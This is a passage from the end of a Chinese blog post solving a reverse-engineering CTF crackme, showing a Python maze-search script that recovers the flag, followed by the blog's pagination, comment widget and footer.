byte_2103C[i])</span><br><span class="line">    <span class="built_in">print</span>(res, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    maze = <span class="string">&quot;*******   E** ***** ***** *****    *&quot;</span></span><br><span class="line">    v4 = [<span class="number">0x53</span>, <span class="number">0x3E</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x1E</span>, <span class="number">0x2C</span>, <span class="number">0x24</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x28</span>, <span class="number">0x37</span>, <span class="number">0x52</span>, <span class="number">0x0E</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># v7纵坐标，v8横坐标</span></span><br><span class="line">    v7, v8 = <span class="number">1</span>, <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 走迷宫</span></span><br><span class="line">    all_node = []</span><br><span class="line">    layer_node = [Node(<span class="literal">None</span>, (v8, v7), <span class="literal">None</span>, <span class="literal">True</span>, <span class="number">0</span>, <span class="literal">None</span>, <span class="literal">None</span>)]</span><br><span class="line">    all_node.extend(layer_node)</span><br><span class="line">    i = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(layer_node) <span class="keyword">and</span> i &lt; <span class="number">11</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        new_layer_node = []</span><br><span class="line">        <span class="keyword">for</span> ln <span class="keyword">in</span> layer_node:</span><br><span class="line">            v7, v8 = ln.y, ln.x</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">                cc = c ^ v4[i]</span><br><span class="line">                v7_tmp, v8_tmp = v7, v8</span><br><span class="line">                <span class="keyword">if</span> cc == <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> v8 != <span class="number">0</span>:</span><br><span class="line">                    v8 -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> cc == <span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>) <span class="keyword">and</span> v8 != <span class="number">5</span>:</span><br><span class="line">                    v8 += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> cc == <span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) <span class="keyword">and</span> v7 != <span class="number">5</span>:</span><br><span class="line">                    v7 += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> cc == <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>) <span class="keyword">and</span> v7 != <span class="number">0</span>:</span><br><span class="line">                    v7 -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> maze[<span class="number">6</span>*v7+v8] != <span class="string">&quot;*&quot;</span> <span class="keyword">and</span> ln.not_action != cc:</span><br><span class="line">                    <span class="keyword">if</span> cc == <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">                        not_action = <span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">                    <span class="keyword">elif</span> cc == <span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>):</span><br><span class="line">                        not_action = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                    <span class="keyword">elif</span> cc == <span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>):</span><br><span class="line">                        not_action = <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                    <span class="keyword">elif</span> cc == <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">                        not_action = <span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">                    new_layer_node.append(Node(c, (v8, v7), ln, <span class="literal">True</span>, i, not_action, cc))</span><br><span class="line">                    ln.is_leaf = <span class="literal">False</span></span><br><span class="line">                v7, v8 = v7_tmp, v8_tmp</span><br><span class="line">        all_node.extend(new_layer_node)</span><br><span class="line">        layer_node = new_layer_node</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> all_node:</span><br><span class="line">        l, r, r2 = n.get_seq()</span><br><span class="line">        <span class="keyword">if</span> l &gt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> r2[::-<span class="number">1</span>][<span class="number">1</span>:]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># flag&#123;welcome_2_A2m_WoRL</span></span><br></pre></td></tr></table></figure>
<p>&emsp;最后可以猜出，<code>flag&#123;welcome_2_A2m_WoRLD&#125;</code>或者<code>flag&#123;welcome_2_A2m_WoRLd&#125;</code></p>

  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2023/03/27/re-core-principle-2/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/03/25/tool-use/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>


	<!-- comment -->
	
<section id="comment">
    <h2 class="title">留言</h2>

    <!-- 
    <div id="disqus_thread" class="ds-thread">
        <script type="text/javascript">
            /**
             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
             */
                /*
                 var disqus_config = function () {
                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 };
                 */
            (function() { // DON'T EDIT BELOW THIS LINE
                var d = document, s = d.createElement('script');

                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';

                s.setAttribute('data-timestamp', +new Date());
                (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
                Disqus.</a></noscript>
    </div> -->
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
        })
    </script>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-03-26 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/re/">re<span>40</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>

	<!-- copyright -->
	<div>
    <ul class="post-copyright">
      <li class="post-copyright-author">
      <strong>作者:  </strong>wd-z711</a>
      </li>
      <li class="post-copyright-link">
      <strong>文章链接:  </strong>
      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
      </li>
      <li class="post-copyright-license">
        <strong>版权声明:   </strong>
        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
        许可协议。转载请注明出处!
      </li>
    </ul>
  <div>
 	

		


</div><!-- row -->




	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2024 wd-z711
  
      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->

     <!-- <script type="text/javascript">
      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
      
      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
    </script> -->
    </p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
   </html>
